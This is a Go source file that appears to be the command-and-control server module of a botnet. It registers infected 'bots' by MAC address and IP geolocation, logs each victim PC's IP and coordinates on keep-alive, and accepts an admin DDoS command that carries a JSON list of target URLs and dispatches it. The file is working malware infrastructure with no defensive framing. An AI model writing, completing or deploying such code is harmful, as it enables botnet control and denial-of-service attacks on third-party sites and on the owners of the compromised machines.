package modules

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"icu/common/constants"
	"icu/common/types"
	"icu/common/utils"
	"icu/lib"
	"net"
	"sync"

	jsoniter "github.com/json-iterator/go"
)

var json = jsoniter.ConfigCompatibleWithStandardLibrary

var receiveBufPool = sync.Pool{
	New: func() any {
		return make([]byte, 0, constants.MAX_PACKET_SIZE)
	},
}

type ClientModule struct {
	sock           net.Conn
	mac            [6]byte
	version        uint8
	type_is        uint8
	ipgeo          *string
	ipgeo_length   *uint16
	crc            uint
	isBotConnected bool
	receiveBuf     []byte
	logger         *lib.Logger
	cache          *lib.Cache
	emitter        *lib.EventEmitter
}

func NewClientModule(sock net.Conn, cache *lib.Cache, emitter *lib.EventEmitter) *ClientModule {
	return &ClientModule{
		sock:           sock,
		mac:            [6]byte{},
		version:        0x00,
		type_is:        0x00,
		ipgeo:          new(string),
		ipgeo_length:   nil,
		crc:            0,
		isBotConnected: false,
		logger:         lib.NewLogger(),
		receiveBuf:     []byte{},
		cache:          cache,
		emitter:        emitter,
	}
}

func (this *ClientModule) IsConnected() bool {
	return this.isBotConnected
}

func (this *ClientModule) TransitData(commandType uint8, commandData *string) {}

func (this *ClientModule) ParseData(socketBuf []byte) {
	if len(socketBuf) == 0 {
		this.emitter.Emit("error", fmt.Sprintf("Received bytes (%d) is NULL!", len(socketBuf)))
		return
	}

	this.receiveBuf = receiveBufPool.Get().([]byte)[:0]
	this.receiveBuf = append(this.receiveBuf, socketBuf...)

	if len(socketBuf) == 1 && socketBuf[0] == byte(constants.BOT_TYPE_KEEP_ALIVE) {
		cache := this.cache.GetCache(utils.MacPrettyConvert(this.mac), "ipgeo").(types.IPGeo)
		this.logger.Info(fmt.Sprintf("Bot (%s) is active client PC[%s (%f, %f)]", utils.MacPrettyConvert(this.mac), cache.IP, cache.Latitude, cache.Longitude))
		return
	}

	if len(socketBuf) == 1 && uint16(socketBuf[0]) == constants.ADMIN_TYPE_KEEP_ALIVE {
		this.logger.Info(fmt.Sprintf("Admin (%s) is active client", utils.MacPrettyConvert(this.mac)))
		return
	}

	packetType := this.receiveBuf[3]
	switch packetType {
	case constants.BOT_TYPE_HELLO:
		this.version = this.receiveBuf[2]

		this.type_is = packetType

		copy(this.mac[:], this.receiveBuf[4:10])

		ipgeo_length := binary.LittleEndian.Uint16(this.receiveBuf[10:12])
		this.ipgeo_length = &ipgeo_length

		ipgeo_prepare := string(this.receiveBuf[12 : 12+*this.ipgeo_length])
		this.ipgeo = &ipgeo_prepare

		if !utils.CheckCRC(this.receiveBuf) {
			this.logger.Warning("CRC detected an error when parsing the packet, not all data was received")
			return
		}

		this.emitter.Emit("hello-pack-received", "")
	case constants.ADMIN_TYPE_HELLO:
		this.version = this.receiveBuf[2]

		this.type_is = packetType

		copy(this.mac[:], this.receiveBuf[4:10])

		if !utils.CheckCRC(this.receiveBuf) {
			this.logger.Warning("CRC detected an error when parsing the packet, not all data was received")
			return
		}

		this.emitter.Emit("hello-pack-received", "")
	case constants.ADMIN_TYPE_REPLY:
		break

	case constants.ADMIN_PACKET_CTYPE_COMMAND_DDOS:
		urlsBytes := this.receiveBuf[5:]

		var urls []string
		if err := json.Unmarshal(urlsBytes, &urls); err != nil {
			this.logger.Error(fmt.Sprintf("Failed parse (%s) to []string", hex.EncodeToString(urlsBytes)))
			return
		}

		this.emitter.Emit("ddos-pack-received", urls)

	default:
		this.emitter.Emit("error", fmt.Sprintf("Failed to get/parse type_is (%d)", packetType))
	}
}

func (this *ClientModule) OnBotDisconnect() {
	if err := this.sock.Close(); err != nil {
		this.logger.Error(fmt.Sprintf("Error close connection for bot (%s): %v", utils.MacPrettyConvert(this.mac), err))
		return
	}

	this.mac = [6]byte{}
	this.version = 0x00
	this.type_is = 0x00
	this.ipgeo = nil
	this.ipgeo_length = nil
	this.crc = 0
	this.isBotConnected = false
}
